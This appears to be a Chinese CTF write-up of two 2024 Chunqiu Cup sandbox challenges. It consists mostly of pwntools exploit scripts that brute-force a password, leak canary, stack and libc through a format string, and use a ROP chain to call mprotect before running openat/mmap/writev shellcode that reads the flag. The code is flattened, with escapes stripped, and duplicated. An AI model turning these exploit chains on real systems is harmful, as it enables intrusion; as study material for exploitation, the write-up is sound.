---
title: web选手入门pwn(18) 2024春秋杯夏季赛两道沙箱题
contest: 春秋杯
year: 2024
difficulty: medium
vuln_type: fmt_string
tags:
- seccomp
- mprotect-RWX
- openat
- mmap
- writev
- prng爆破
- shellcode
attack_chain: 题目1逐字符8位a-z爆破password(8*26=208次)通过successfully+power!!!双信号退出/sendlineafter power!!!触发fmt串%9$p-%10$p-%15$p泄canary+stack+libc/mprotect(stack_base,0x10000,7)改栈为RWX/写ORW-shellcode 题目2单条read读shellcode后跳入栈+writev核弹
key_payload: 题目1 payload = A*56 + p64(canary) + p64(stack) + p64(mprotect_args) + asm(shellcode)  题目2 shellcode 写/flag到0x1337500+writev结构体到0x1337510+openat(257)+mmap(9)+writev(20)
one_liner: 春秋杯两道沙箱题打通用户态shellcode三件套(mprotect+openat+mmap+writev)。
lesson: seccomp沙箱下system/binsh失效必须ORW；writev能一次把多块非连续内存写到fd；mprotect改栈权限+跳回栈执行是seccomp题最干净的RCE路径。
quality: high
full_path: web选手入门pwn(18)_——2024年春秋杯夏季赛两道沙箱题.full.md
meta_path: web选手入门pwn(18)_——2024年春秋杯夏季赛两道沙箱题.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: web选手入门pwn(18) 2024春秋杯夏季赛两道沙箱题。春秋杯两道沙箱题打通用户态shellcode三件套(mprotect+openat+mmap+writev)。。经验：seccomp沙箱下system/binsh失效必须ORW；writev能一次把多块非连续内存写到fd；mprotect...
category: pwn
subcategory: pwn_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/199199.html
reasoning_chain:
- 题目 1 passwd 8 字符 a-z 爆破 + sendsureafter 'power!!!' 触发 fmt 串 → 触发点：seccomp 沙箱下 system/binsh 失效必须 ORW
- 动作：fmt 串 %9$p-%15$p 泄 canary/stack/libc → 观察：fmt 残基泄露三件套
- 假设：栈可写 + mprotect 改权限 → 动作：mprotect(stack_base, 0x10000, 0x7) 把栈改 RWX
- 动作：payload A*56 + p64(canary) + p64(stack) + p64(mprotect_args) + asm(shellcode) → 观察：栈执行 ORW
- 题目 2 单条 read 读 shellcode 后跳入栈 → 假设：writev 一次写多块非连续内存到 fd
- 动作：shellcode 写 /flag 到 0x1337500 + writev 结构体到 0x1337510 + openat(257) + mmap(9) + writev(20)
- 观察：writev 把 mmap 出来的内存写入 fd 完成 ORW → 完成
failed_attempts:
- 题目 1 试图用 system(/bin/sh) → 失败：seccomp 阻断 execve
- 题目 1 试图用 mprotect 跳到固定地址 → 失败：栈地址随机化
- 题目 2 试图用 read/write 系统调用循环 → 失败：writev 一次写多块效率更高
key_observations:
- seccomp 沙箱下 system/binsh 失效必须 ORW
- writev 能一次把多块非连续内存写到 fd
- mprotect 改栈权限 + 跳回栈执行是 seccomp 题最干净的 RCE 路径
- fmt 残基 %N$p 配合 canary + stack + libc 三件套是常见入门栈利用
prerequisites:
- pwntools asm() shellcode 编写
- Linux seccomp / ORW syscall（openat/read/write/mmap/mprotect）
- x86_64 栈调用约定（pop rdi/rsi/rdx syscall）
- 格式化字符串漏洞（%N$p 泄漏）
---
# web选手入门pwn(18) ——2024年春秋杯夏季赛两道沙箱题

> 原文: https://www.ctfiot.com/199199.html
> ID: 199199

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./SavethePrincess","b *mainnc")sh = process("./SavethePrincess")
elf = ELF("./SavethePrincess")libc = ELF("./libc.so.6")

def replace_char_at_index(s, index, new_char): return s[:
index] + new_char + s[index+1:]

def magic(passwd): sh.sendlineafter(">","1") sh.sendlineafter("password:",passwd) return sh.recvuntil("!!!")
passwd = 'A'*10;
for i in range(0, 8): for ii in range(ord('a'), ord('z') + 1): passwd = replace_char_at_index(passwd, i, chr(ii)) nononno = magic(passwd) if "successfully" in nononno: print(passwd) break if chr(i+1) in nononno: print("ok!") print(passwd) breakpasswd = passwd[0:8]print(passwd)sh.interactive()

int mprotect(void * addr, size_t len, int prot)mprotect(stack_base, 0x10000, 0x7)

from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./SavethePrincess","b *0x5555555556c5nc")#sh = process("./SavethePrincess")
elf = ELF("./SavethePrincess")libc = ELF("./libc.so.6")

def replace_char_at_index(s, index, new_char): return s[:
index] + new_char + s[index+1:]
def magic(passwd): sh.sendlineafter(">","1") sh.sendlineafter("password:",passwd) return sh.recvuntil("!!!")
passwd = 'A'*10;
for i in range(0, 8): for ii in range(ord('a'), ord('z') + 1): passwd = replace_char_at_index(passwd, i, chr(ii)) nononno = magic(passwd) if "successfully" in nononno: print(passwd) break if chr(i+1) in nononno: print("ok!") print(passwd) breakpasswd = passwd[0:8]print(passwd)
sh.sendlineafter(">","1")sh.sendlineafter("password:",passwd)sh.sendafter("power!!!","%9$p-%10$p-%15$p")ret = sh.recvuntil("1.")canary = int(ret[3:19],16)print('canary: '+hex(canary))stack = int(ret[22:34],16)print('stack: '+hex(stack))stack_base = int(ret[22:31]+'000',16)print('stack_base: '+hex(stack_base))__libc_start_main_48 = int(ret[37:49],16)libc_base = __libc_start_main_48 + 48 - libc.sym['__libc_start_main']print('libc_base: '+hex(libc_base))
mprotect_addr = libc_base + libc.sym['mprotect']pop_rdi_ret = libc_base + 0x2a3e5pop_rsi_ret = libc_base + 0x2be51pop_rdx_r12_ret = libc_base + 0x11f2e7
payload = "A" * 56 + p64(canary) + p64(stack) + p64(pop_rdi_ret) + p64(stack_base) + p64(pop_rsi_ret) + p64(0x10000) + p64(pop_rdx_r12_ret) + p64(0x7) + p64(0x0) + p64(mprotect_addr)
sh.sendlineafter(">","2")sh.sendlineafter("dragon!!",payload)
sh.interactive()

payload = "A" * 56 + p64(canary) + p64(stack)payload += p64(pop_rdi_ret) + p64(stack_base) + p64(pop_rsi_ret) + p64(0x10000) + p64(pop_rdx_r12_ret) + p64(0x7) + p64(0x0) + p64(mprotect_addr)payload += p64(stack+48)payload += "x90" * 8

eax = 0x9; mmap的系统调用号rdi = 0x10000; 第一个参数rsi = 0x1000; 第二个参数rdx = 0x7; 第三个参数r10 = 0x12; 第四个参数r8 = 0x3; 第五个参数r9 = 0x0; 第六个参数

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./SavethePrincess","b *0x5555555556c5nc")sh = process("./SavethePrincess")
elf = ELF("./SavethePrincess")libc = ELF("./libc.so.6")

def replace_char_at_index(s, index, new_char): return s[:
index] + new_char + s[index+1:]
def magic(passwd): sh.sendlineafter(">","1") sh.sendlineafter("password:",passwd) return sh.recvuntil("!!!")
passwd = 'A'*10;
for i in range(0, 8): for ii in range(ord('a'), ord('z') + 1): passwd = replace_char_at_index(passwd, i, chr(ii)) nononno = magic(passwd) if "successfully" in nononno: print(passwd) break if chr(i+1) in nononno: print("ok!") print(passwd) breakpasswd = passwd[0:8]print(passwd)
sh.sendlineafter(">","1")sh.sendlineafter("password:",passwd)sh.sendafter("power!!!","%9$p-%10$p-%15$p")ret = sh.recvuntil("1.")canary = int(ret[3:19],16)print('canary: '+hex(canary))stack = int(ret[22:34],16)print('stack: '+hex(stack))stack_base = int(ret[22:31]+'000',16)print('stack_base: '+hex(stack_base))__libc_start_main_48 = int(ret[37:49],16)libc_base = __libc_start_main_48 + 48 - libc.sym['__libc_start_main']print('libc_base: '+hex(libc_base))
mprotect_addr = libc_base + libc.sym['mprotect']pop_rdi_ret = libc_base + 0x2a3e5pop_rsi_ret = libc_base + 0x2be51pop_rdx_r12_ret = libc_base + 0x11f2e7

shellcode =''' mov rax, 0x67616c662f push rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 push SYS_openat pop rax syscall
 mov rdi, 0x10000 mov rsi, 0x1000 mov rdx, 7 push 0x12 pop r10 push 0x3 pop r8 xor r9, r9 push SYS_mmap pop rax syscall
 mov rdi, 1 mov rsi,0x10000 mov rdx,0x40 push SYS_write pop rax syscall
'''
payload = "A" * 56 + p64(canary) + p64(stack)payload += p64(pop_rdi_ret) + p64(stack_base) + p64(pop_rsi_ret) + p64(0x10000) + p64(pop_rdx_r12_ret) + p64(0x7) + p64(0x0) + p64(mprotect_addr)payload += p64(stack+48)payload += asm(shellcode)
sh.sendlineafter(">","2")sh.sendlineafter("dragon!!",payload)
sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./Shuffled_Execution","b *0x555555555560nc")#sh = process("./Shuffled_Execution")
elf = ELF("./Shuffled_Execution")
payload = "xBEx00x00x00x00"+"x90"*8sh.sendlineafter("entrance.", payload)
sh.interactive()

ssize_t writev( int fd, const struct iovec *iov, int cnt );
struct iovec {char *iov_base; /*基本地址指针，指向缓冲区*/size_t iov_len; /*指定缓冲区长度*/};

shellcode =''' mov esp, 0x1337800 mov rax, 0x67616c662f push rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 push SYS_openat pop rax syscall
 mov rdi, 0x10000 mov rsi, 0x1000 mov rdx, 7 push 0x12 pop r10 push 0x3 pop r8 xor r9, r9 push SYS_mmap pop rax syscall'''shellcode +=''' mov rdi, 1 mov rsi,0x1337008 mov rdx, 1 push SYS_writev pop rax syscall'''payload = "xBEx00x00x00x00x90x90x90"payload += p64(0x10000)payload += p64(0x1000)payload += asm(shellcode)

shellcode +=''' mov rdi, 1 mov rsi,0x1337200 mov rdx, 1 push SYS_writev pop rax syscall
'''
print(len(asm(shellcode)))
payload = "xBEx00x00x00x00x90x90x90"payload += asm(shellcode)payload = payload.ljust(0x200,"x00")payload += p64(0x10000)payload += p64(0x1000)

from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./Shuffled_Execution","b *0x555555555560nc")#sh = process("./Shuffled_Execution")
elf = ELF("./Shuffled_Execution")
shellcode ='''    mov esi, 0                    #BE 00 00 00 00，00截断
 mov rdi, 0x1337500 #在0x1337500写入/flag mov rax, 0x67616c662f mov [rdi], rax
 mov rdi, 0x1337510 #在0x1337510写入0x1338000，作为writev所需结构体 mov rax, 0x1338000 mov [rdi], rax
 mov rdi, 0x1337518 #在0x1337518写入0x100，作为writev所需结构体 mov rax, 0x100 mov [rdi], rax mov rax, 257 #openat系统调用号 xor rdi, rdi #依次设置参数 sub rdi, 100 mov rsi, 0x1337500 xor rdx, rdx xor r10, r10 syscall
    mov rax, 9                    #mmap系统调用号 mov rdi, 0x1338000 #依次设置参数 mov rsi, 0x100 mov rdx, 7 mov r10, 0x12 mov r8, 3 xor r9, r9 syscall
 mov rax, 20 #writev系统调用号    mov rdi, 1                     #依次设置参数 mov rsi, 0x1337510 mov rdx, 1 syscall'''
payload = asm(shellcode)
sh.sendlineafter("entrance.",payload)
sh.interactive()


```
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./SavethePrincess","b *mainnc")sh = process("./SavethePrincess")
elf = ELF("./SavethePrincess")libc = ELF("./libc.so.6")

def replace_char_at_index(s, index, new_char): return s[:
index] + new_char + s[index+1:]

def magic(passwd): sh.sendlineafter(">","1") sh.sendlineafter("password:",passwd) return sh.recvuntil("!!!")
passwd = 'A'*10;
for i in range(0, 8): for ii in range(ord('a'), ord('z') + 1): passwd = replace_char_at_index(passwd, i, chr(ii)) nononno = magic(passwd) if "successfully" in nononno: print(passwd) break if chr(i+1) in nononno: print("ok!") print(passwd) breakpasswd = passwd[0:8]print(passwd)sh.interactive()
int mprotect(void * addr, size_t len, int prot)mprotect(stack_base, 0x10000, 0x7)
from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./SavethePrincess","b *0x5555555556c5nc")#sh = process("./SavethePrincess")
elf = ELF("./SavethePrincess")libc = ELF("./libc.so.6")

def replace_char_at_index(s, index, new_char): return s[:
index] + new_char + s[index+1:]
def magic(passwd): sh.sendlineafter(">","1") sh.sendlineafter("password:",passwd) return sh.recvuntil("!!!")
passwd = 'A'*10;
for i in range(0, 8): for ii in range(ord('a'), ord('z') + 1): passwd = replace_char_at_index(passwd, i, chr(ii)) nononno = magic(passwd) if "successfully" in nononno: print(passwd) break if chr(i+1) in nononno: print("ok!") print(passwd) breakpasswd = passwd[0:8]print(passwd)
sh.sendlineafter(">","1")sh.sendlineafter("password:",passwd)sh.sendafter("power!!!","%9$p-%10$p-%15$p")ret = sh.recvuntil("1.")canary = int(ret[3:19],16)print('canary: '+hex(canary))stack = int(ret[22:34],16)print('stack: '+hex(stack))stack_base = int(ret[22:31]+'000',16)print('stack_base: '+hex(stack_base))__libc_start_main_48 = int(ret[37:49],16)libc_base = __libc_start_main_48 + 48 - libc.sym['__libc_start_main']print('libc_base: '+hex(libc_base))
mprotect_addr = libc_base + libc.sym['mprotect']pop_rdi_ret = libc_base + 0x2a3e5pop_rsi_ret = libc_base + 0x2be51pop_rdx_r12_ret = libc_base + 0x11f2e7
payload = "A" * 56 + p64(canary) + p64(stack) + p64(pop_rdi_ret) + p64(stack_base) + p64(pop_rsi_ret) + p64(0x10000) + p64(pop_rdx_r12_ret) + p64(0x7) + p64(0x0) + p64(mprotect_addr)
sh.sendlineafter(">","2")sh.sendlineafter("dragon!!",payload)
sh.interactive()
payload = "A" * 56 + p64(canary) + p64(stack)payload += p64(pop_rdi_ret) + p64(stack_base) + p64(pop_rsi_ret) + p64(0x10000) + p64(pop_rdx_r12_ret) + p64(0x7) + p64(0x0) + p64(mprotect_addr)payload += p64(stack+48)payload += "x90" * 8
eax = 0x9; mmap的系统调用号rdi = 0x10000; 第一个参数rsi = 0x1000; 第二个参数rdx = 0x7; 第三个参数r10 = 0x12; 第四个参数r8 = 0x3; 第五个参数r9 = 0x0; 第六个参数
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./SavethePrincess","b *0x5555555556c5nc")sh = process("./SavethePrincess")
elf = ELF("./SavethePrincess")libc = ELF("./libc.so.6")

def replace_char_at_index(s, index, new_char): return s[:
index] + new_char + s[index+1:]
def magic(passwd): sh.sendlineafter(">","1") sh.sendlineafter("password:",passwd) return sh.recvuntil("!!!")
passwd = 'A'*10;
for i in range(0, 8): for ii in range(ord('a'), ord('z') + 1): passwd = replace_char_at_index(passwd, i, chr(ii)) nononno = magic(passwd) if "successfully" in nononno: print(passwd) break if chr(i+1) in nononno: print("ok!") print(passwd) breakpasswd = passwd[0:8]print(passwd)
sh.sendlineafter(">","1")sh.sendlineafter("password:",passwd)sh.sendafter("power!!!","%9$p-%10$p-%15$p")ret = sh.recvuntil("1.")canary = int(ret[3:19],16)print('canary: '+hex(canary))stack = int(ret[22:34],16)print('stack: '+hex(stack))stack_base = int(ret[22:31]+'000',16)print('stack_base: '+hex(stack_base))__libc_start_main_48 = int(ret[37:49],16)libc_base = __libc_start_main_48 + 48 - libc.sym['__libc_start_main']print('libc_base: '+hex(libc_base))
mprotect_addr = libc_base + libc.sym['mprotect']pop_rdi_ret = libc_base + 0x2a3e5pop_rsi_ret = libc_base + 0x2be51pop_rdx_r12_ret = libc_base + 0x11f2e7

shellcode =''' mov rax, 0x67616c662f push rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 push SYS_openat pop rax syscall
 mov rdi, 0x10000 mov rsi, 0x1000 mov rdx, 7 push 0x12 pop r10 push 0x3 pop r8 xor r9, r9 push SYS_mmap pop rax syscall
 mov rdi, 1 mov rsi,0x10000 mov rdx,0x40 push SYS_write pop rax syscall
'''
payload = "A" * 56 + p64(canary) + p64(stack)payload += p64(pop_rdi_ret) + p64(stack_base) + p64(pop_rsi_ret) + p64(0x10000) + p64(pop_rdx_r12_ret) + p64(0x7) + p64(0x0) + p64(mprotect_addr)payload += p64(stack+48)payload += asm(shellcode)
sh.sendlineafter(">","2")sh.sendlineafter("dragon!!",payload)
sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./Shuffled_Execution","b *0x555555555560nc")#sh = process("./Shuffled_Execution")
elf = ELF("./Shuffled_Execution")
payload = "xBEx00x00x00x00"+"x90"*8sh.sendlineafter("entrance.", payload)
sh.interactive()
ssize_t writev( int fd, const struct iovec *iov, int cnt );
struct iovec {char *iov_base; /*基本地址指针，指向缓冲区*/size_t iov_len; /*指定缓冲区长度*/};
shellcode =''' mov esp, 0x1337800 mov rax, 0x67616c662f push rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 push SYS_openat pop rax syscall
 mov rdi, 0x10000 mov rsi, 0x1000 mov rdx, 7 push 0x12 pop r10 push 0x3 pop r8 xor r9, r9 push SYS_mmap pop rax syscall'''shellcode +=''' mov rdi, 1 mov rsi,0x1337008 mov rdx, 1 push SYS_writev pop rax syscall'''payload = "xBEx00x00x00x00x90x90x90"payload += p64(0x10000)payload += p64(0x1000)payload += asm(shellcode)
shellcode +=''' mov rdi, 1 mov rsi,0x1337200 mov rdx, 1 push SYS_writev pop rax syscall
'''
print(len(asm(shellcode)))
payload = "xBEx00x00x00x00x90x90x90"payload += asm(shellcode)payload = payload.ljust(0x200,"x00")payload += p64(0x10000)payload += p64(0x1000)
from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./Shuffled_Execution","b *0x555555555560nc")#sh = process("./Shuffled_Execution")
elf = ELF("./Shuffled_Execution")
shellcode ='''    mov esi, 0                    #BE 00 00 00 00，00截断
 mov rdi, 0x1337500 #在0x1337500写入/flag mov rax, 0x67616c662f mov [rdi], rax
 mov rdi, 0x1337510 #在0x1337510写入0x1338000，作为writev所需结构体 mov rax, 0x1338000 mov [rdi], rax
 mov rdi, 0x1337518 #在0x1337518写入0x100，作为writev所需结构体 mov rax, 0x100 mov [rdi], rax mov rax, 257 #openat系统调用号 xor rdi, rdi #依次设置参数 sub rdi, 100 mov rsi, 0x1337500 xor rdx, rdx xor r10, r10 syscall
    mov rax, 9                    #mmap系统调用号 mov rdi, 0x1338000 #依次设置参数 mov rsi, 0x100 mov rdx, 7 mov r10, 0x12 mov r8, 3 xor r9, r9 syscall
 mov rax, 20 #writev系统调用号    mov rdi, 1                     #依次设置参数 mov rsi, 0x1337510 mov rdx, 1 syscall'''
payload = asm(shellcode)
sh.sendlineafter("entrance.",payload)
sh.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]